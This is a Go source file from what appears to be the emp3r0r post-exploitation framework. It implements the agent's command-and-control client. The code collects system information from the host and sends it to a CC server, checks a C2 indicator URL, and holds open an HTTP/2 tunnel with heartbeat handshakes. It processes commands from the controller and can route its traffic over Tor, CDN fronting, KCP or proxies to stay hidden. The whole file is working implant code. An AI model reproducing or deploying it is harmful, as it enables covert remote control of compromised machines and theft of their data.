package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

// CheckIn poll CC server and report its system info
func CheckIn() (err error) {
	info := CollectSystemInfo()
	checkin_URL := emp3r0r_def.CCAddress + tun.CheckInAPI + "/" + uuid.NewString()
	log.Printf("Collected system info, now checking in (%s)", checkin_URL)

	conn, _, _, err := ConnectCC(checkin_URL)
	if err != nil {
		return err
	}
	defer conn.Close()
	out := json.NewEncoder(conn)
	err = out.Encode(info)
	if err == nil {
		log.Println("Checked in")
	}
	return err
}

// ConditionalC2Yes check RuntimeConfig.CCIndicator for conditional C2 connetion
func ConditionalC2Yes(proxy string) bool {
	log.Printf("Checking CCIndicator: %s", RuntimeConfig.CCIndicatorURL)
	t := &http.Transport{
		Dial: (&net.Dialer{
			Timeout:   60 * time.Second,
			KeepAlive: 30 * time.Second,
		}).Dial,
		TLSHandshakeTimeout: 60 * time.Second,
	}
	if proxy != "" && strings.HasPrefix(emp3r0r_def.Transport, "HTTP2") {
		proxyUrl, err := url.Parse(proxy)
		if err != nil {
			log.Fatalf("invalid proxy: %v", err)
		}
		t.Proxy = http.ProxyURL(proxyUrl)
		log.Printf("IsCCOnline: using proxy %s", proxy)
	}
	client := http.Client{
		Transport: t,
		Timeout:   30 * time.Second,
	}
	resp, err := client.Get(RuntimeConfig.CCIndicatorURL)
	if err != nil {
		log.Printf("IsCCOnline: %s: %v", RuntimeConfig.CCIndicatorURL, err)
		return false
	}
	_, err = io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("IsCCOnline: %s: %v", RuntimeConfig.CCIndicatorURL, err)
		return false
	}
	defer resp.Body.Close()

	return true
}

func catchInterruptAndExit(cancel context.CancelFunc) {
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	<-sig
	log.Println("Cancelling due to interrupt")
	cancel()
	os.Exit(0)
}

// ConnectCC connect to CC with h2conn
func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel context.CancelFunc, err error) {
	var resp *http.Response
	defer func() {
		if conn == nil {
			err = fmt.Errorf("connectCC at %s failed", url)
			cancel()
		}
	}()

	// use h2conn for duplex tunnel
	ctx, cancel = context.WithCancel(context.Background())

	h2 := h2conn.Client{
		Client: emp3r0r_def.HTTPClient,
		Header: http.Header{
			"AgentUUID":    {RuntimeConfig.AgentUUID},
			"AgentUUIDSig": {RuntimeConfig.AgentUUIDSig},
		},
	}
	log.Printf("ConnectCC: connecting to %s", url)
	go func() {
		conn, resp, err = h2.Connect(ctx, url)
		if err != nil {
			err = fmt.Errorf("connectCC: initiate h2 conn: %s", err)
			log.Print(err)
			cancel()
		}
		// Check server status code
		if resp != nil {
			if resp.StatusCode != http.StatusOK {
				err = fmt.Errorf("bad status code: %d", resp.StatusCode)
				return
			}
		}
	}()

	// kill connection on timeout
	countdown := 10
	for conn == nil && countdown > 0 {
		countdown--
		time.Sleep(time.Second)
	}

	return
}

// HandShakes record each hello message and C2's reply
var (
	HandShakes      = make(map[string]bool)
	HandShakesMutex = &sync.RWMutex{}
)

// CCMsgTun use the connection (CCConn)
func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
	var (
		in  = json.NewDecoder(emp3r0r_def.CCMsgConn)
		out = json.NewEncoder(emp3r0r_def.CCMsgConn)
		msg emp3r0r_def.MsgTunData // data being exchanged in the tunnel
	)
	go catchInterruptAndExit(cancel)
	defer func() {
		err = emp3r0r_def.CCMsgConn.Close()
		if err != nil {
			log.Print("CCMsgTun closing: ", err)
		}

		cancel()
		emp3r0r_def.KCPKeep = false // tell KCPClient to close this conn so we won't stuck
		log.Print("CCMsgTun closed")
	}()

	// check for CC server's response
	go func() {
		log.Println("Check CC response: started")
		defer cancel()
		for ctx.Err() == nil {
			// read response
			err = in.Decode(&msg)
			if err != nil {
				log.Print("Check CC response: JSON msg decode: ", err)
				break
			}
			payload := msg.Payload
			if strings.HasPrefix(payload, "hello") {
				log.Printf("Hello (%s) received", payload)
				// mark the hello as success
				for hello := range HandShakes {
					if strings.HasPrefix(payload, hello) {
						log.Printf("Hello (%s) acknowledged", payload)
						HandShakesMutex.Lock()
						HandShakes[hello] = true
						HandShakesMutex.Unlock()
						break
					}
				}
				continue
			}

			// process CC data
			go processCCData(&msg)
		}
		log.Println("Check CC response: exited")
	}()

	wait_hello := func(hello string) bool {
		// delete key, forget about this hello when we are done
		defer func() {
			HandShakesMutex.Lock()
			delete(HandShakes, hello)
			HandShakesMutex.Unlock()
		}()
		// wait until timeout or success
		for i := 0; i < RuntimeConfig.CCTimeout; i++ {
			// if hello marked as success, return true
			HandShakesMutex.RLock()
			isSuccess := HandShakes[hello]
			HandShakesMutex.RUnlock()
			if isSuccess {
				log.Printf("Hello (%s) done", hello)
				return true
			}
			time.Sleep(time.Millisecond)
		}
		log.Printf("Hello (%s) timeout", hello)
		return false
	}

	sendHello := func(cnt int) bool {
		var hello_msg emp3r0r_def.MsgTunData
		// try cnt times then exit
		for cnt > 0 {
			cnt-- // consume cnt

			// send hello
			hello_msg.Payload = "hello" + util.RandStr(util.RandInt(1, 100))
			hello_msg.Tag = RuntimeConfig.AgentTag
			err = out.Encode(hello_msg)
			if err != nil {
				log.Printf("agent cannot connect to cc: %v", err)
				util.TakeABlink()
				continue
			}
			HandShakesMutex.Lock()
			HandShakes[hello_msg.Payload] = false
			HandShakesMutex.Unlock()
			log.Printf("Hello (%s) sent", hello_msg.Payload)
			if !wait_hello(hello_msg.Payload) {
				cancel()
				break
			}
			return true
		}
		return false
	}

	// keep connected
	for ctx.Err() == nil {
		log.Println("Hearbeat begins")
		if !sendHello(util.RandInt(1, 10)) {
			log.Print("sendHello failed")
			break
		}
		err = CheckIn()
		if err != nil {
			log.Printf("Updating agent sysinfo: %v", err)
		}
		log.Println("Hearbeat ends")
		util.TakeASnap()
	}

	return fmt.Errorf("CCMsgTun closed: %v", ctx.Err())
}

// set C2Transport
func setC2Transport() {
	if tun.IsTor(emp3r0r_def.CCAddress) {
		emp3r0r_def.Transport = fmt.Sprintf("TOR (%s)", emp3r0r_def.CCAddress)
		return
	} else if RuntimeConfig.CDNProxy != "" {
		emp3r0r_def.Transport = fmt.Sprintf("CDN (%s)", RuntimeConfig.CDNProxy)
		return
	} else if RuntimeConfig.UseKCP {
		emp3r0r_def.Transport = fmt.Sprintf("KCP (%s)",
			emp3r0r_def.CCAddress)
		return
	} else if RuntimeConfig.C2TransportProxy != "" {
		// parse proxy url
		proxyURL, err := url.Parse(RuntimeConfig.C2TransportProxy)
		if err != nil {
			log.Printf("invalid proxy URL: %v", err)
		}

		// if the proxy port is emp3r0r proxy server's port
		if proxyURL.Port() == RuntimeConfig.AgentSocksServerPort && proxyURL.Hostname() == "127.0.0.1" {
			emp3r0r_def.Transport = fmt.Sprintf("Reverse Proxy: %s", RuntimeConfig.C2TransportProxy)
			return
		}
		if proxyURL.Port() == RuntimeConfig.ShadowsocksLocalSocksPort && proxyURL.Hostname() == "127.0.0.1" {
			emp3r0r_def.Transport = fmt.Sprintf("Auto Proxy: %s", RuntimeConfig.C2TransportProxy)
			return
		}

		emp3r0r_def.Transport = fmt.Sprintf("Proxy %s", RuntimeConfig.C2TransportProxy)
		return
	} else {
		emp3r0r_def.Transport = fmt.Sprintf("HTTP2 (%s)", emp3r0r_def.CCAddress)
	}
}
